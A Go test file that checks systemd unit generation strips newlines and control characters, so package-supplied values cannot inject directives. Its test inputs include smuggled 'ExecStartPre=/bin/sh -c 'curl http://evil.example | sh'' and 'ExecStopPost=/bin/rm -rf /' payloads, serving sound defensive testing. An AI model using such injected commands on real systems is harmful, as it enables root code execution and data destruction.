// IRON RULE: make test-full must always be able to run simultaneously in the
// same repository without conflicting. Nothing else matters more than this.

package systemd

import (
	"strings"
	"testing"
)

// packages.Compile refuses a value carrying a control character, so nothing
// reaching unit generation should have one. These tests cover the backstop:
// unit generation has no error return, and this is the last point before the
// bytes are written into /etc/systemd/system.
//
// The failure being backstopped is that quoting does not contain a newline. A
// unit-file directive ends at the first raw newline regardless of the open
// quote, so `-e 'FOO=a\nExecStartPre=...'` is two directives, and the second
// runs on the host as root.

func TestQuoteCommandArgDropsNewline(t *testing.T) {
	got := quoteCommandArg("FOO=ok\nExecStartPre=/bin/sh -c 'id'")

	if strings.Contains(got, "\n") {
		t.Fatalf("quoteCommandArg emitted a raw newline: %q", got)
	}
}

func TestQuoteCommandArgDropsControlBytes(t *testing.T) {
	for name, arg := range map[string]string{
		"carriage return": "a\rb",
		"NUL":             "a\x00b",
		"escape":          "a\x1bb",
		"DEL":             "a\x7fb",
	} {
		got := quoteCommandArg(arg)
		if strings.ContainsFunc(got, isUnitControlChar) {
			t.Errorf("quoteCommandArg(%s) = %q, still carries a control character", name, got)
		}
	}
}

// Tab survives: it is legitimate whitespace, and quoting genuinely does contain
// it. It also still forces quoting, since systemd's tokenizer splits on it.
func TestQuoteCommandArgKeepsTabAndQuotesIt(t *testing.T) {
	got := quoteCommandArg("col1\tcol2")

	if !strings.Contains(got, "\t") {
		t.Errorf("quoteCommandArg dropped a tab: %q", got)
	}
	if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
		t.Errorf("quoteCommandArg(%q) = %q, want it single-quoted", "col1\tcol2", got)
	}
}

// Existing units must stay byte-for-byte stable: an arg that needed no quoting
// before still gets none, and one that did still gets the same quoting.
func TestQuoteCommandArgUnchangedForOrdinaryArgs(t *testing.T) {
	for arg, want := range map[string]string{
		"nginx":            "nginx",
		"--port=8080":      "--port=8080",
		"/usr/bin/env":     "/usr/bin/env",
		"a && exec b":      "'a && exec b'",
		"--lc-collate=C x": "'--lc-collate=C x'",
		"it's":             `'it'\''s'`,
		"":                 "''",
	} {
		if got := quoteCommandArg(arg); got != want {
			t.Errorf("quoteCommandArg(%q) = %q, want %q", arg, got, want)
		}
	}
}

// countDirectives counts lines that actually START a directive with the given
// key — not occurrences of the text.
//
// The distinction is the whole assertion. Once the newline is stripped, the
// payload survives as text INSIDE the quoted -e value:
//
//	-e 'FOO=harmlessExecStartPre=/bin/sh -c '\''curl ...'\'''
//
// which is one argument to podman and exactly what should happen — the package
// asked for a silly environment value and got one. Counting the substring would
// call that an injection; counting directives sees that systemd parses one.
// A continuation line (the previous line ended in a backslash) can never start
// a directive, so those are skipped.
func countDirectives(content, key string) int {
	n := 0
	continued := false
	for raw := range strings.SplitSeq(content, "\n") {
		wasContinued := continued
		continued = strings.HasSuffix(raw, "\\")
		if wasContinued {
			continue
		}
		if strings.HasPrefix(strings.TrimSpace(raw), key) {
			n++
		}
	}
	return n
}

// The end-to-end shape: a generated unit must never carry a DIRECTIVE the
// package did not legitimately produce.
func TestGeneratePackageUnitsCannotBeInjectedIntoViaEnvironment(t *testing.T) {
	clean := GeneratePackageUnits(PackageUnitConfig{
		RepoName:    "core",
		PkgName:     "victim",
		Version:     "1.0",
		Image:       "docker.io/library/nginx:latest",
		Environment: map[string]string{"FOO": "harmless"},
	})

	injected := GeneratePackageUnits(PackageUnitConfig{
		RepoName: "core",
		PkgName:  "victim",
		Version:  "1.0",
		Image:    "docker.io/library/nginx:latest",
		Environment: map[string]string{
			"FOO": "harmless\nExecStartPre=/bin/sh -c 'curl http://evil.example | sh'",
		},
	})

	got := countDirectives(injected.Service.Content, "ExecStartPre=")
	want := countDirectives(clean.Service.Content, "ExecStartPre=")
	if got != want {
		t.Fatalf("injected unit has %d ExecStartPre directives, clean unit has %d:\n%s",
			got, want, injected.Service.Content)
	}

	// The payload text may legitimately survive inside the quoted value — the
	// package asked for a silly environment value and got one. What must not
	// survive is it starting its own directive.
	for raw := range strings.SplitSeq(injected.Service.Content, "\n") {
		if strings.HasPrefix(strings.TrimSpace(raw), "ExecStartPre=/bin/sh -c 'curl") {
			t.Fatalf("payload became its own directive:\n%s", injected.Service.Content)
		}
	}

	// And no raw newline escaped into the file at all, which is the mechanism.
	if strings.Contains(injected.Service.Content, "harmless\n") {
		t.Fatalf("the injected newline survived into the unit:\n%s", injected.Service.Content)
	}
}

// The same, through the command, which is the other author-controlled argv
// position.
func TestGeneratePackageUnitsCannotBeInjectedIntoViaCommand(t *testing.T) {
	units := GeneratePackageUnits(PackageUnitConfig{
		RepoName: "core",
		PkgName:  "victim",
		Version:  "1.0",
		Image:    "docker.io/library/nginx:latest",
		Command:  []string{"sh", "-c", "echo hi\nExecStopPost=/bin/rm -rf /"},
	})

	if strings.Contains(units.Service.Content, "\nExecStopPost=/bin/rm") {
		t.Fatalf("command injected an ExecStopPost directive:\n%s", units.Service.Content)
	}
}

// A generated unit must parse as one directive per line. Any line inside
// [Service] that is neither a continuation nor a KEY=VALUE is evidence a value
// broke out of its directive.
func TestGeneratedUnitHasNoOrphanLines(t *testing.T) {
	units := GeneratePackageUnits(PackageUnitConfig{
		RepoName: "core",
		PkgName:  "victim",
		Version:  "1.0",
		Image:    "docker.io/library/nginx:latest",
		Environment: map[string]string{
			"A": "first\nsecond",
			"B": "ok",
		},
	})

	continued := false
	for raw := range strings.SplitSeq(units.Service.Content, "\n") {
		line := strings.TrimSpace(raw)
		wasContinued := continued
		continued = strings.HasSuffix(raw, "\\")

		if line == "" || strings.HasPrefix(line, "[") || strings.HasPrefix(line, "#") || wasContinued {
			continue
		}
		if !strings.Contains(line, "=") {
			t.Errorf("orphan line in generated unit (a value escaped its directive): %q", line)
		}
	}
}
